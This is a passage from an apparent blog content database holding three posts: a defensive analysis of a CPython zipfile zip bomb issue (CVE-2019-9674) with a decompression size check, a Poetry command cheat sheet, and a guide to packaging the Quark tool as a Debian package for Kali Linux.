empty.</p>\n<p>Changed in version 3.6: max_length can be used as a keyword argument.</p>\n</blockquote>\n<p>Max_length represents the file block size that can be read into the memory at a time and is marked with unconsumed_tail to see if any remaining files need to be decompressed.</p>\n<p>Therefore, his idea is more than 102400 bytes. If there is any remaining data, it means there may be a zip bomb.</p>\n<p><img src=\"https://i.imgur.com/7schHy0.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h1><p>I reported a zip bomb vulnerability to the CPython community in 2019. Here are all the interesting resources and ideas.</p>\n<p><a href=\"https://bugs.python.org/issue36462\">Issue Discussion on BPO</a></p>\n<p><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9674\">CVE-2019-9674</a></p>\n<p><a href=\"https://docs.python.org/3/library/zipfile.html#decompression-pitfalls\">Decompression pitfall I wrote for official documentation</a></p>\n<p><a href=\"https://github.com/python/cpython/pull/13378\">Pull Request related it</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=-S4JVQt6GX4&ab_channel=PyConKorea\">PyCon Korea 2019 - Click Click Boom! Bombs Over Our Minds</a></p>\n<h1 id=\"zipfile-analysis\"><a href=\"#zipfile-analysis\" class=\"headerlink\" title=\"zipfile analysis\"></a>zipfile analysis</h1><p>According to Black Hat’s  <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf\">Cara Marie</a> research, there are some solutions against Zip Bomb. By limiting the size of the block to be read at a time, if there is still data remaining after the block that needs to be decompressed after reading this block, it is considered that it is possible to be a Zip Bomb.</p>\n<p>Below is <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf\">Cara Marie</a> code</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decompress</span>(<span class=\"params\">data, maxsize=<span class=\"number\">1024000</span></span>):</span><br><span class=\"line\">    dec = zlib.decompressobj()</span><br><span class=\"line\">    data = dec.decompress(data, maxsize)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> dec.unconsumed_tail:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;Possible bomb&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">del</span> dec</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the strategy to defeating the zip bomb is by limiting a block, in this case, is max size 102400. However, we take a look at the Python standard library, <a href=\"https://github.com/python/cpython/blob/3.9/Lib/zipfile.py\">zipfile</a>.</p>\n<hr>\n<p>According to Cara Marie’s approach, we try to figure out the difference between zipfile and zlib and <strong>why we can’t use zipfile directly for preventing zip bombs</strong>, so we started to study zipfile source code.</p>\n<h1 id=\"zipfile\"><a href=\"#zipfile\" class=\"headerlink\" title=\"zipfile\"></a><a href=\"https://github.com/python/cpython/blob/master/Lib/zipfile.py\">zipfile</a></h1><p>Since I focus on the zip format and pick the most commonly used algorithm, DEFLATED algorithm. Inside the zipfile, we can see the location of unzipped function, starting at line <code>702</code>, getting the zlib object, and finally returning the object.</p>\n<p><strong><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L702-L716\">zlib.decompressobj(-15)</a></strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_get_decompressor</span>(<span class=\"params\">compress_type</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> compress_type == ZIP_STORED:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> compress_type == ZIP_DEFLATED:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> zlib.decompressobj(-<span class=\"number\">15</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> compress_type == ZIP_BZIP2:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bz2.BZ2Decompressor()</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> compress_type == ZIP_LZMA:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> LZMADecompressor()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        descr = compressor_names.get(compress_type)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> descr:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> NotImplementedError(<span class=\"string\">&quot;compression type %d (%s)&quot;</span> % (compress_type, descr))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> NotImplementedError(<span class=\"string\">&quot;compression type %d&quot;</span> % (compress_type,))</span><br></pre></td></tr></table></figure>\n\n<p>From the above code, we can know that the zipfile is based on what zlib does. So we have to deep dive into what zlib did?</p>\n<h1 id=\"zlib\"><a href=\"#zlib\" class=\"headerlink\" title=\"zlib\"></a><a href=\"https://docs.python.org/3/library/zlib.html\">zlib</a></h1><p>According to the zlib documentation</p>\n<blockquote>\n<p>There are two ways to compression and decompression, .compress() and .decompress() will fit all files into memory at once. In contrast to the method of the object. It using .compressobj() and .decompressobj() which won’t fit into memory at once.</p>\n</blockquote>\n<p>There are two ways to compress&#x2F;decompress.</p>\n<ol>\n<li>.compress() and .decompress() will put the entire file into memory at a time</li>\n<li>.compressobj() and .decompressobj() separate the file , compress&#x2F;decompress one block at a time</li>\n</ol>\n<hr>\n<p>However, the official documentation does not clearly explain how to use the API to decompress files. The purpose of this method is to obtain the file data stream and decompress it through the Low-Level method. And we went back to the zipfile module and found that they had already done the decompression of zlib, so we planned to apply the patch for zipfile first.</p>\n<p>In the way that zipfile belongs to <code>decompressobj</code>, we have the first way to accumulate chunks. As long as we can find out where to do the decompression of chunks, we accumulate it and give a threshold. If it exceeds, then consider that it is possible to be the zip bomb.</p>\n<h1 id=\"Get-back-at-the-zipfile\"><a href=\"#Get-back-at-the-zipfile\" class=\"headerlink\" title=\"Get back at the zipfile\"></a>Get back at the zipfile</h1><ol>\n<li>Starting with the object</li>\n</ol>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L706\">Line 706</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> zlib.decompressobj(-<span class=\"number\">15</span>)</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L791\">Line 791</a></p>\n<p>It is the place where the class of zlib.decompressobj(-15) object is obtained and initialized.</p>\n<p>which belongs to ZipExtFile class</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, fileobj, mode, zipinfo, decrypter=<span class=\"literal\">None</span>,close_fileobj=<span class=\"literal\">False</span></span>):</span><br></pre></td></tr></table></figure>\n\n<p>Let’s find out what <code>fileobj</code> is</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L1545\">Line 1545</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> ZipExtFile(zef_file, mode, zinfo, zd, <span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Return the class, and use zef_file, then follow zef_file</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L719\">Line 719</a></p>\n<p>_SharedFile being initialized</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, file, pos, close, lock, writing</span>):</span><br></pre></td></tr></table></figure>\n\n<p>Here we know that when zlib is decompressed, you can’t start decompressing directly to Streaming, and you need to skip the file encoding in front of the zip file.</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L759\">Line 759</a></p>\n<p>In class _Tellable: to initialize the position of the indicator that gets the file descriptor</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, fp</span>):</span><br><span class=\"line\">    self.fp = fp</span><br><span class=\"line\">    self.offset = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>and then</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L977-L984\">Line 977</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">elif</span> self._compress_type == ZIP_DEFLATED:</span><br><span class=\"line\">    n = <span class=\"built_in\">max</span>(n, self.MIN_READ_SIZE)</span><br><span class=\"line\">    data = self._decompressor.decompress(data, n)</span><br><span class=\"line\">    self._eof = (self._decompressor.eof <span class=\"keyword\">or</span></span><br><span class=\"line\">                 self._compress_left &lt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span></span><br><span class=\"line\">                 <span class=\"keyword\">not</span> self._decompressor.unconsumed_tail)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> self._eof:</span><br><span class=\"line\">        data += self._decompressor.flush()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>We observed that after choosing to use the ZIP_DEFLATED compression algorithm, we did a function max to get n.</p>\n<h1 id=\"Key-Point\"><a href=\"#Key-Point\" class=\"headerlink\" title=\"Key Point\"></a>Key Point</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">max</span>(n, self.MIN_READ_SIZE)</span><br></pre></td></tr></table></figure>\n\n<p>When you use zlib.decompressobj as a block, how big is your block?<br>, self.MIN_READ_SIZE is preset to 4096 bytes, which is the size of a page in the operating system.</p>\n<h2 id=\"Cara-Marie’s-solution\"><a href=\"#Cara-Marie’s-solution\" class=\"headerlink\" title=\"Cara Marie’s solution\"></a>Cara Marie’s solution</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decompress</span>(<span class=\"params\">data, maxsize=<span class=\"number\">1024000</span></span>):</span><br><span class=\"line\">    dec = zlib.decompressobj()</span><br><span class=\"line\">    data = dec.decompress(data, maxsize)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> dec.unconsumed_tail:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;Possible bomb&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">del</span> dec</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"It-sets-maxsize-to-102400-bytes\"><a href=\"#It-sets-maxsize-to-102400-bytes\" class=\"headerlink\" title=\"It sets maxsize to 102400 bytes\"></a>It sets maxsize to 102400 bytes</h2><p>According to the official document</p>\n<blockquote>\n<p>Decompress.decompress(data, max_length&#x3D;0)<br>Decompress data, returning a bytes object containing the uncompressed data corresponding to at least part of the data in the string. This data should be concatenated to the output produced by any preceding calls to the decompress() method. Some of the input data may be preserved in internal buffers for later processing.</p>\n<p>If the optional parameter max_length is non-zero then the return value will be no longer than max_length. This may mean that not all of the compressed input can be processed, and unconsumed data will be stored in the attribute unconsumed_tail. This byte string must be passed to a subsequent call to decompress() if decompression is to continue. If max_length is zero then the whole input is decompressed, and unconsumed_tail is empty.</p>\n<p>Changed in version 3.6: max_length can be used as a keyword argument.</p>\n</blockquote>\n<p>Max_length represents the file block size that can be read into the memory at a time and is marked with unconsumed_tail to see if any remaining files need to be decompressed.</p>\n<p>Therefore, his idea is more than 102400 bytes. If there is any remaining data, it means there may be a zip bomb.</p>\n<p><img src=\"https://i.imgur.com/7schHy0.png\"></p>\n"},{"title":"Cheat sheet for poetry","date":"2022-05-04T06:05:07.000Z","_content":"\n# Cheat sheet for poetry\n\n\n\n## Init project\n\n```bash=\npoetry init\n```\n\n\n## Open existing project\n\n```bash=\npoetry install\n```\n\n\n## Build shell\n\n```bash=\npoetry env use python3\n```\n\n## Active\n\n```bash=\npoetry shell\n```\n\n## New Package\n\n```bash=\npoetry add black\n\npoetry add pendulum@^2.0.5\npoetry add \"pendulum>=2.0.5\"\n```\n\n\n## Remove Package\n\n\n```bash=\npoetry remove\n```\n\n\n\n## New Package -dev\n\n```bash=\npoetry add black -D\n```\n\n## Lock Package\n\n```bash=\npoetry lock\n```\n\n\n\n## Export\n\n```bash=\npoetry export -f requirements.txt -o requirements.txt --without-hashes --dev\n```\n","source":"_posts/Cheat-sheet-for-poetry.md","raw":"---\ntitle: Cheat sheet for poetry\ndate: 2022-05-04 14:05:07\ntags:\n---\n\n# Cheat sheet for poetry\n\n\n\n## Init project\n\n```bash=\npoetry init\n```\n\n\n## Open existing project\n\n```bash=\npoetry install\n```\n\n\n## Build shell\n\n```bash=\npoetry env use python3\n```\n\n## Active\n\n```bash=\npoetry shell\n```\n\n## New Package\n\n```bash=\npoetry add black\n\npoetry add pendulum@^2.0.5\npoetry add \"pendulum>=2.0.5\"\n```\n\n\n## Remove Package\n\n\n```bash=\npoetry remove\n```\n\n\n\n## New Package -dev\n\n```bash=\npoetry add black -D\n```\n\n## Lock Package\n\n```bash=\npoetry lock\n```\n\n\n\n## Export\n\n```bash=\npoetry export -f requirements.txt -o requirements.txt --without-hashes --dev\n```\n","slug":"Cheat-sheet-for-poetry","published":1,"updated":"2023-04-20T07:41:28.341Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmp0006i7ri18sw6jxz","content":"<h1 id=\"Cheat-sheet-for-poetry\"><a href=\"#Cheat-sheet-for-poetry\" class=\"headerlink\" title=\"Cheat sheet for poetry\"></a>Cheat sheet for poetry</h1><h2 id=\"Init-project\"><a href=\"#Init-project\" class=\"headerlink\" title=\"Init project\"></a>Init project</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry init</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Open-existing-project\"><a href=\"#Open-existing-project\" class=\"headerlink\" title=\"Open existing project\"></a>Open existing project</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry install</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Build-shell\"><a href=\"#Build-shell\" class=\"headerlink\" title=\"Build shell\"></a>Build shell</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry <span class=\"built_in\">env</span> use python3</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Active\"><a href=\"#Active\" class=\"headerlink\" title=\"Active\"></a>Active</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry shell</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"New-Package\"><a href=\"#New-Package\" class=\"headerlink\" title=\"New Package\"></a>New Package</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry add black</span><br><span class=\"line\"></span><br><span class=\"line\">poetry add pendulum@^2.0.5</span><br><span class=\"line\">poetry add <span class=\"string\">&quot;pendulum&gt;=2.0.5&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Remove-Package\"><a href=\"#Remove-Package\" class=\"headerlink\" title=\"Remove Package\"></a>Remove Package</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry remove</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"New-Package-dev\"><a href=\"#New-Package-dev\" class=\"headerlink\" title=\"New Package -dev\"></a>New Package -dev</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry add black -D</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Lock-Package\"><a href=\"#Lock-Package\" class=\"headerlink\" title=\"Lock Package\"></a>Lock Package</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry lock</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Export\"><a href=\"#Export\" class=\"headerlink\" title=\"Export\"></a>Export</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry <span class=\"built_in\">export</span> -f requirements.txt -o requirements.txt --without-hashes --dev</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Cheat-sheet-for-poetry\"><a href=\"#Cheat-sheet-for-poetry\" class=\"headerlink\" title=\"Cheat sheet for poetry\"></a>Cheat sheet for poetry</h1><h2 id=\"Init-project\"><a href=\"#Init-project\" class=\"headerlink\" title=\"Init project\"></a>Init project</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry init</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Open-existing-project\"><a href=\"#Open-existing-project\" class=\"headerlink\" title=\"Open existing project\"></a>Open existing project</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry install</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Build-shell\"><a href=\"#Build-shell\" class=\"headerlink\" title=\"Build shell\"></a>Build shell</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry <span class=\"built_in\">env</span> use python3</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Active\"><a href=\"#Active\" class=\"headerlink\" title=\"Active\"></a>Active</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry shell</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"New-Package\"><a href=\"#New-Package\" class=\"headerlink\" title=\"New Package\"></a>New Package</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry add black</span><br><span class=\"line\"></span><br><span class=\"line\">poetry add pendulum@^2.0.5</span><br><span class=\"line\">poetry add <span class=\"string\">&quot;pendulum&gt;=2.0.5&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Remove-Package\"><a href=\"#Remove-Package\" class=\"headerlink\" title=\"Remove Package\"></a>Remove Package</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry remove</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"New-Package-dev\"><a href=\"#New-Package-dev\" class=\"headerlink\" title=\"New Package -dev\"></a>New Package -dev</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry add black -D</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Lock-Package\"><a href=\"#Lock-Package\" class=\"headerlink\" title=\"Lock Package\"></a>Lock Package</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry lock</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Export\"><a href=\"#Export\" class=\"headerlink\" title=\"Export\"></a>Export</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">poetry <span class=\"built_in\">export</span> -f requirements.txt -o requirements.txt --without-hashes --dev</span><br></pre></td></tr></table></figure>\n"},{"title":"Debian Packaging","date":"2021-05-03T08:10:42.000Z","_content":"\n# Debian Packaging\n\nA while ago, I would like to package Quark to Debian package since we want to make Quark be part of Kali Linux. You can have a look at the link below.\n\n[Kali Linux issue 0007121](https://bugs.kali.org/view.php?id=7121)\n\n## Kali Linux Release\n\n### 1. Prepare your Kali Linux virtual machine to build the Debian package.\n\n- [Virtualbox](https://www.virtualbox.org/wiki/Downloads)\n- [Kail Linux image for virtualbox](https://www.kali.org/get-kali/#kali-virtual-machines)\n\n\n#### Update your kali Linux package source\n\n```bash\necho \"deb http://http.kali.org/kali kali-rolling main non-free contrib\" | sudo tee /etc/apt/sources.list\n\nsudo apt-get update\n```\n\nAfter setting up your virtual machine, you have to install the required packages based on the official documentation on this [website](https://www.kali.org/docs/development/setting-up-packaging-system/).\n\n\n#### Install the required dependencies\n\n```bash\nsudo apt install -y packaging-dev apt-file gitk mr\n\nsudo apt-get install -y devscripts debhelper dh-make git-buildpackage sbuild dh-python python3-all\n```\n\n#### Set up sbuild and log in again after completion\n\n```\nsudo mkdir -p /srv/chroots/\n\ncd /srv/chroots/\n\nsudo sbuild-createchroot --keyring=/usr/share/keyrings/kali-archive-keyring.gpg --arch=amd64 --components=main,contrib,non-free --include=kali-archive-keyring kali-dev kali-dev-amd64-sbuild http://http.kali.org/kali\n\necho \"source-root-groups=root,sbuild\" | sudo tee -a /etc/schroot/chroot.d/kali-dev-amd64-sbuild*\n\nsudo sbuild-adduser $USER\n```\n\n### 2. Creating the Debian files\n\nThe Debian package needs that the following four files are required in the debian directory.\n\n* control\n* copyright\n* changelog\n* rules\n\n[Here](https://www.debian.org/doc/manuals/maint-guide/dreq.en.html) is the official documentation on how to write all four files.\n\n### 3. Importing the Quark project\n\nPlease replace the version number you would like to update.\n\n```bash\nmkdir -p ~/kali/packages/quark-engine ~/kali/upstream/\n\nwget https://github.com/quark-engine/quark-engine/archive/refs/tags/v21.4.3.tar.gz  -O ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz\n\ncd /home/kali/kali/packages/quark-engine\n\ngit init\n\ngbp import-orig ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz\n```\n\n\n### 4. Build Package\n\n```bash\ngbp buildpackage --git-builder=sbuild\n```\n\nThen you will have the Quark `.deb` file if everything goes well.\n\n### 5. Request package upgrade\n\n1. Register [Kali Linux Bug Tracker](https://bugs.kali.org/my_view_page.php)\n\n2. Report an issue\n\nReport an issue by clicking the \"Report Issue\"\n\n![](https://i.imgur.com/R7fGbSY.png)\n\n3. Fill out the form\n\nPlease choose the \"Tool upgrade request\" option in `category` and \"kali-dev\" option in `product version` and keep anything else default value.\n\n![](https://i.imgur.com/Wclavqq.png)\n\nThe next step is filling out the summary and the description.\n\n4. Attach the .deb file\n\nUpload the `.deb` file you just created earlier.\n\n![](https://i.imgur.com/5Mbu3hf.png)\n\n5. Submit the issue\n\nWhen everything is all set, you can click \"Submit issue\".\n\nReference\nhttps://www.kali.org/docs/development/public-packaging/\nhttps://www.kali.org/docs/development/intro-to-packaging-example/\nhttps://www.kali.org/docs/development/setting-up-packaging-system/\nhttps://www.kali.org/docs/development/advanced-packaging-example/","source":"_posts/Debian-Packaging.md","raw":"---\ntitle: Debian Packaging\ndate: 2021-05-03 16:10:42\ntags:\n- Debian\n- Linux\n- Kali Linux\n---\n\n# Debian Packaging\n\nA while ago, I would like to package Quark to Debian package since we want to make Quark be part of Kali Linux. You can have a look at the link below.\n\n[Kali Linux issue 0007121](https://bugs.kali.org/view.php?id=7121)\n\n## Kali Linux Release\n\n### 1. Prepare your Kali Linux virtual machine to build the Debian package.\n\n- [Virtualbox](https://www.virtualbox.org/wiki/Downloads)\n- [Kail Linux image for virtualbox](https://www.kali.org/get-kali/#kali-virtual-machines)\n\n\n#### Update your kali Linux package source\n\n```bash\necho \"deb http://http.kali.org/kali kali-rolling main non-free contrib\" | sudo tee /etc/apt/sources.list\n\nsudo apt-get update\n```\n\nAfter setting up your virtual machine, you have to install the required packages based on the official documentation on this [website](https://www.kali.org/docs/development/setting-up-packaging-system/).\n\n\n#### Install the required dependencies\n\n```bash\nsudo apt install -y packaging-dev apt-file gitk mr\n\nsudo apt-get install -y devscripts debhelper dh-make git-buildpackage sbuild dh-python python3-all\n```\n\n#### Set up sbuild and log in again after completion\n\n```\nsudo mkdir -p /srv/chroots/\n\ncd /srv/chroots/\n\nsudo sbuild-createchroot --keyring=/usr/share/keyrings/kali-archive-keyring.gpg --arch=amd64 --components=main,contrib,non-free --include=kali-archive-keyring kali-dev kali-dev-amd64-sbuild http://http.kali.org/kali\n\necho \"source-root-groups=root,sbuild\" | sudo tee -a /etc/schroot/chroot.d/kali-dev-amd64-sbuild*\n\nsudo sbuild-adduser $USER\n```\n\n### 2. Creating the Debian files\n\nThe Debian package needs that the following four files are required in the debian directory.\n\n* control\n* copyright\n* changelog\n* rules\n\n[Here](https://www.debian.org/doc/manuals/maint-guide/dreq.en.html) is the official documentation on how to write all four files.\n\n### 3. Importing the Quark project\n\nPlease replace the version number you would like to update.\n\n```bash\nmkdir -p ~/kali/packages/quark-engine ~/kali/upstream/\n\nwget https://github.com/quark-engine/quark-engine/archive/refs/tags/v21.4.3.tar.gz  -O ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz\n\ncd /home/kali/kali/packages/quark-engine\n\ngit init\n\ngbp import-orig ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz\n```\n\n\n### 4. Build Package\n\n```bash\ngbp buildpackage --git-builder=sbuild\n```\n\nThen you will have the Quark `.deb` file if everything goes well.\n\n### 5. Request package upgrade\n\n1. Register [Kali Linux Bug Tracker](https://bugs.kali.org/my_view_page.php)\n\n2. Report an issue\n\nReport an issue by clicking the \"Report Issue\"\n\n![](https://i.imgur.com/R7fGbSY.png)\n\n3. Fill out the form\n\nPlease choose the \"Tool upgrade request\" option in `category` and \"kali-dev\" option in `product version` and keep anything else default value.\n\n![](https://i.imgur.com/Wclavqq.png)\n\nThe next step is filling out the summary and the description.\n\n4. Attach the .deb file\n\nUpload the `.deb` file you just created earlier.\n\n![](https://i.imgur.com/5Mbu3hf.png)\n\n5. Submit the issue\n\nWhen everything is all set, you can click \"Submit issue\".\n\nReference\nhttps://www.kali.org/docs/development/public-packaging/\nhttps://www.kali.org/docs/development/intro-to-packaging-example/\nhttps://www.kali.org/docs/development/setting-up-packaging-system/\nhttps://www.kali.org/docs/development/advanced-packaging-example/","slug":"Debian-Packaging","published":1,"updated":"2023-04-20T07:41:28.341Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmq0007i7rihz0f9idz","content":"<h1 id=\"Debian-Packaging\"><a href=\"#Debian-Packaging\" class=\"headerlink\" title=\"Debian Packaging\"></a>Debian Packaging</h1><p>A while 